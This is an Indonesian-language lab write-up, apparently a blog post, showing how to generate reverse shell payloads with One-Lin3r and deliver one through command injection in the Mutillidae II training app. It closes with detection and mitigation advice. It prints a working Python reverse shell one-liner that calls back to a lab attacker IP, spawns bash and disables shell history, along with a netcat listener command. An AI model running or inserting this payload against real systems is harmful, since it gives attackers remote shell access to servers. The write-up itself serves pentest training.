# Reverse Shell dengan One-Lin3r: Membuat Payload Reverse Shell dalam Satu Baris

[🇬🇧 Read in English](command-injection-reverse-shell-en.md)

Hai Friend,

Pada tulisan kali ini saya ingin berbagi pengalaman saat mempelajari **Reverse Shell**, salah satu teknik yang umum digunakan dalam **Penetration Testing** setelah berhasil memperoleh **Command Execution** pada sebuah server.

Artikel ini berfokus pada cara membuat payload Reverse Shell menggunakan **One-Lin3r**. Tool ini bukan digunakan untuk mengeksploitasi sebuah kerentanan, melainkan membantu menghasilkan payload secara otomatis sehingga pentester tidak perlu menghafal berbagai sintaks dari banyak bahasa pemrograman.

---

# Apa itu Reverse Shell?

Reverse Shell adalah teknik di mana **mesin target membuat koneksi keluar (outbound connection)** menuju mesin milik attacker atau pentester sehingga shell interaktif dapat diperoleh dari jarak jauh.

Berbeda dengan **Bind Shell** yang membuka port pada sisi target, Reverse Shell memanfaatkan koneksi keluar sehingga sering kali lebih mudah melewati firewall yang hanya mengizinkan trafik outbound.

Perlu dipahami bahwa **Reverse Shell bukanlah sebuah kerentanan**, melainkan **payload** yang dijalankan setelah penyerang berhasil memperoleh kemampuan menjalankan perintah pada sistem target.

---

# Root Cause

Reverse Shell hanya dapat dijalankan apabila penyerang telah memperoleh **Command Execution** pada server.

Beberapa kerentanan yang umum menjadi titik masuk antara lain:

- Command Injection
- Remote Code Execution (RCE)
- Unsafe File Upload
- Insecure Deserialization
- Web Shell
- Local Privilege Escalation

Pada demonstrasi kali ini, **Command Injection** menjadi akar penyebab (*root cause*) yang memungkinkan payload Reverse Shell dieksekusi.

Alur serangan secara sederhana dapat digambarkan sebagai berikut.

```text
Command Injection
        │
        ▼
Command Execution
        │
        ▼
Reverse Shell Payload
        │
        ▼
Outbound Connection
        │
        ▼
Interactive Shell
```

---

# Mengapa Menggunakan One-Lin3r?

Reverse Shell tersedia dalam berbagai implementasi bergantung pada teknologi yang tersedia pada server, misalnya:

- Bash
- Python
- PHP
- Perl
- Ruby
- PowerShell
- Netcat
- Socat

Menghafalkan seluruh payload tersebut tentu bukan pekerjaan yang mudah.

**One-Lin3r** membantu menghasilkan payload secara otomatis. Pengguna hanya perlu menentukan:

- Jenis payload
- IP Address listener
- Port listener

Kemudian tool akan menghasilkan payload siap digunakan.

Repository:

https://github.com/D4Vinci/One-Lin3r

Berikut daftar payload yang tersedia.

![List Payload One-Lin3r](one-lin3r-list.png)

---

# Topologi Lab

Pada demonstrasi ini saya menggunakan lingkungan lab sederhana berbasis VMware.

| Peran | Keterangan | IP Address |
| :--- | :--- | :--- |
| **Attacker** | Kali Linux | `10.10.10.149` |
| **Target Web** | Ubuntu Server (Mutillidae II) | `10.10.10.2` |

```text
+-------------------------------------------------+
|            VMware - 10.10.10.0/24               |
|                                                 |
|  +---------------+      +-------------------+   |
|  |  Kali Linux   |      |   Ubuntu Server   |   |
|  |  [ATTACKER]   |      |   [TARGET WEB]    |   |
|  |  nc Listener  | <--- |   Reverse Shell   |   |
|  | 10.10.10.149  |      |   10.10.10.2      |   |
|  |   Port 9001   |      |   Mutillidae II   |   |
|  +---------------+      +-------------------+   |
+-------------------------------------------------+
```

---

# Membuat Payload Reverse Shell

Pilih payload berikut pada One-Lin3r.

```text
linux/python/socket_reverse
```

Kemudian tentukan alamat listener.

```text
10.10.10.149:9001
```

One-Lin3r akan menghasilkan payload seperti berikut.

![Craft Payload](Craft-the-payloads-revershell.png)

```python
python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
```

Payload di atas melakukan beberapa proses secara otomatis:

- Membuat koneksi TCP menuju mesin attacker.
- Menghubungkan **stdin**, **stdout**, dan **stderr** ke socket.
- Menjalankan `/bin/bash`.
- Membentuk shell interaktif melalui pseudo-terminal (`pty`).

Apabila diperlukan, IP Address dan Port dapat diubah menggunakan editor seperti VS Code atau Notepad++.

---

# Menjalankan Listener

Sebelum payload dieksekusi pada target, attacker harus membuka listener menggunakan Netcat.

```bash
nc -lvnp 9001
```

Listener akan menunggu koneksi masuk dari target.

---

# Demonstrasi melalui Command Injection

Pada demonstrasi ini saya menggunakan aplikasi latihan **Mutillidae II** yang memiliki kerentanan **Command Injection**.

Kerentanan ini memungkinkan input pengguna diteruskan ke sistem operasi tanpa validasi yang memadai sehingga attacker dapat menyisipkan perintah tambahan.

Sebagai ilustrasi sederhana:

```bash
ping <input_user>
```

Apabila aplikasi tidak melakukan validasi input, attacker dapat menyisipkan payload sehingga command tambahan ikut dieksekusi oleh sistem operasi.

Pada contoh berikut, payload Reverse Shell ditempelkan ke parameter yang rentan.

![Command Injection](command-injection.png)

Ketika payload berhasil dieksekusi oleh server, target akan membuat koneksi TCP menuju listener Netcat pada mesin attacker.

---

# Hasil

Apabila listener aktif dan koneksi tidak diblokir oleh firewall, Netcat akan menerima koneksi dari server target.

![Backdoor Connection](backdoor-terkoneksi.png)

Shell interaktif berhasil diperoleh dan attacker kini dapat menjalankan perintah pada sistem target sesuai hak akses proses aplikasi web.

---

# Detection

Aktivitas Reverse Shell umumnya masih dapat dideteksi melalui beberapa indikator berikut.

- Proses aplikasi web menjalankan shell (`/bin/bash`, `sh`, `cmd.exe`, `powershell.exe`).
- Adanya koneksi outbound yang tidak biasa menuju IP eksternal.
- Log EDR atau Sysmon yang menunjukkan proses membuat koneksi jaringan.
- Aktivitas Netcat, Bash, Python, atau PowerShell yang tidak lazim.

Monitoring proses dan koneksi outbound merupakan salah satu cara efektif untuk mendeteksi aktivitas Reverse Shell.

---

# Mitigasi

Karena Reverse Shell hanyalah payload, maka mitigasi utamanya adalah mencegah **Command Execution** pada server.

Beberapa langkah yang dapat diterapkan antara lain:

- Validasi seluruh input pengguna.
- Hindari penggunaan fungsi yang mengeksekusi command sistem operasi.
- Terapkan prinsip **Least Privilege** pada service aplikasi.
- Batasi koneksi outbound yang tidak diperlukan.
- Gunakan EDR, IDS/IPS, atau monitoring proses dan jaringan.
- Lakukan audit log secara berkala untuk mendeteksi aktivitas yang tidak biasa.

---

# Kesimpulan

Reverse Shell bukan merupakan sebuah kerentanan, melainkan payload yang digunakan setelah attacker berhasil memperoleh **Command Execution** pada sistem target.

Pada demonstrasi ini, **Command Injection** menjadi akar penyebab yang memungkinkan payload Reverse Shell dijalankan. Sementara itu, **One-Lin3r** berperan sebagai payload generator yang membantu menghasilkan berbagai variasi Reverse Shell secara cepat tanpa perlu menghafal sintaks dari banyak bahasa pemrograman.

Bagi seorang pentester, tool seperti One-Lin3r dapat mempercepat proses pengujian. Sedangkan dari sudut pandang defender, fokus utama seharusnya adalah mencegah kemampuan **Command Execution** serta memonitor aktivitas proses dan koneksi outbound yang mencurigakan.

---

# Referensi

- **One-Lin3r (GitHub)**  
  https://github.com/D4Vinci/One-Lin3r

- **PayloadsAllTheThings – Reverse Shell Cheat Sheet**  
  https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

- **PentestMonkey – Reverse Shell Cheat Sheet**  
  https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/

- **MITRE ATT&CK – Command and Scripting Interpreter (T1059)**  
  https://attack.mitre.org/techniques/T1059/

---

Terima kasih sudah membaca.

Semoga tulisan singkat ini dapat membantu memahami hubungan antara **Command Injection**, **Command Execution**, dan **Reverse Shell**, serta bagaimana **One-Lin3r** dapat digunakan untuk menghasilkan payload secara cepat dalam lingkungan pengujian yang legal dan terkontrol.
